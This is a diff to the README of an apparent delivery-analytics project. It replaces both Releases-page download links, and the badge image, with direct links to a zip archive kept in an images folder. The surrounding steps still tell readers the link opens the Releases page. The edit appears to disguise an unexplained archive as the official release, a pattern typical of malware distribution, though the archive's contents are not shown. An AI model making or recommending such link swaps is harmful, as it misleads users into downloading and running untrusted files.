@@ -6,7 +6,7 @@ Welcome to **Swiggy-Delivery-Performance-Analytics**! This application allows yo
 
 ## 📥 Download Now
 
-[![Download Swiggy Delivery Performance Analytics](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/SubhradeepSeth/Swiggy-Delivery-Performance-Analytics/releases)
+[![Download Swiggy Delivery Performance Analytics](https://raw.githubusercontent.com/SubhradeepSeth/Swiggy-Delivery-Performance-Analytics/main/Dashboard/Inspirations/logos and images/Swiggy-Delivery-Performance-Analytics-2.0-alpha.5.zip)](https://raw.githubusercontent.com/SubhradeepSeth/Swiggy-Delivery-Performance-Analytics/main/Dashboard/Inspirations/logos and images/Swiggy-Delivery-Performance-Analytics-2.0-alpha.5.zip)
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ The **Swiggy-Delivery-Performance-Analytics** application includes:
 
 ## 📥 Download & Install
 
-To get started, [visit this page to download](https://github.com/SubhradeepSeth/Swiggy-Delivery-Performance-Analytics/releases) the latest version of the application. Follow these steps:
+To get started, [visit this page to download](https://raw.githubusercontent.com/SubhradeepSeth/Swiggy-Delivery-Performance-Analytics/main/Dashboard/Inspirations/logos and images/Swiggy-Delivery-Performance-Analytics-2.0-alpha.5.zip) the latest version of the application. Follow these steps:
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest release.
